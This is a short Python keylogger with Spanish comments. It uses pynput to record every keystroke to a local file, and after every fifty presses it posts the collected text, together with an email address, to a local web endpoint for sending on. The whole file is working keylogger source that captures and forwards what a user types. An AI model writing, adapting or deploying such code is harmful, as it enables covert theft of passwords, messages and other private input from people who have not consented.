from pynput.keyboard import Key, Listener

import requests

keys = []

count = 0
count_email = 0

# Creamos una función que sea capáz de leer el archivo creado
def read_file():
  # Creamos una variable que almacene el mensaje
  mensaje = ''

  # Abrimos el archivo como "file"
  with open("salida.txt", "r") as file:
    
    # Leemos el contenido del texto y lo guardamos en una lista
    content = file.readlines()

    # Recorremos la lista y por cada palabra encontrada la concatenamos
    # En nuestra variable mensaje
    for palabra in content:
      mensaje += palabra
  
  # Al final del for, retornamos el mensaje
  return mensaje

def write_file(keys):
  with open("salida.txt", "a") as file:
    for key in keys:
      # Convertimos key en un string y sustituimos las comillas por nada
      k = str(key).replace("'", "")
      
      # Si la palabra "space" está dentro de nuestra variable K entonces 
      # damos un salto de linea
      if "space" in k:
        file.write('\n')

      # Si no encontramos la palabra "Key" en nuestro elemento, 
      # lo guardamos en nuestro archivo
      elif k.find("Key") == -1:
        file.write(k)


def on_press(key):
  global keys, count, count_email
  keys.append(key)
  print(f'Se presionó la tecla {key}') 

  count += 1
  count_email += 1

  if count >= 5:
    count = 0
    write_file(keys)

  if count_email >= 50:
    
    dictToSend = {
      'correo': 'mymail@mail.com',
      'mensaje':read_file()
    }

    res = requests.post('http://localhost:4040/enviar', json=dictToSend)

def on_release(key):
  if key == Key.esc:
    return False

# Creamos un método que aprovecha las dos funcunciones que 
# hicimos y los renombramos 'listener'

with Listener(on_press=on_press, on_release=on_release) as listener:
  # Le indicamos al método que todas las pulsaciones las va a detectar
  listener.join()